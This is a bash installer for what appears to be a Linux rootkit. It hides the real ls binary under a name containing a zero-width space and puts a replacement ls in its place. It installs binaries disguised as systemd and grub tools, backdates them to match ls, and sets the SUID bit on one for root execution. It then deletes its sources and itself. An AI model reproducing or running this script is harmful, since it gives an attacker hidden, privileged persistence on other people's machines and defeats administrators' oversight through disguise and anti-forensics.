#!/bin/bash
if [ $# -eq 0 ]; then
    echo "No arguments supplied; assuming first time"
	mv "/usr/bin/ls" "/usr/sbin/ls​" #THERE IS A ZERO WIDTH SPACE HERE
else
	if [ $1 != "--reinstall" ]; then
		mv "/usr/bin/ls" "/usr/sbin/ls​" #THERE IS A ZERO WIDTH SPACE HERE
	fi
fi
#Build executables
#NOTE: This requires the packages golang and gcc to be installed
gcc systemd-restart.c
go build systemd-path.go
go build ls_over.go

#Copy files to /usr/bin
mv ls_over /usr/bin/ls
mv a.out /usr/bin/systemd-restart
cp systemd-path /usr/sbin/grub-display
mv systemd-path /usr/bin/

#Change ownership to root, just in case
chown root:root /usr/bin/systemd-path
chown root:root /usr/bin/ls
chown root:root /usr/bin/systemd-restart

#Change dates of files
touch -d "$(date -R -r /usr/sbin/ls​)" /usr/bin/ls
touch -d "$(date -R -r /usr/sbin/ls​)" /usr/bin/systemd-path
touch -d "$(date -R -r /usr/sbin/ls​)" /usr/bin/systemd-restart

#Set suid so the process will always execute with system privileges
chmod u+s /usr/bin/systemd-restart

#Remove files
rm systemd-restart.c
rm systemd-path.go
rm ls_over.go
rm install.sh
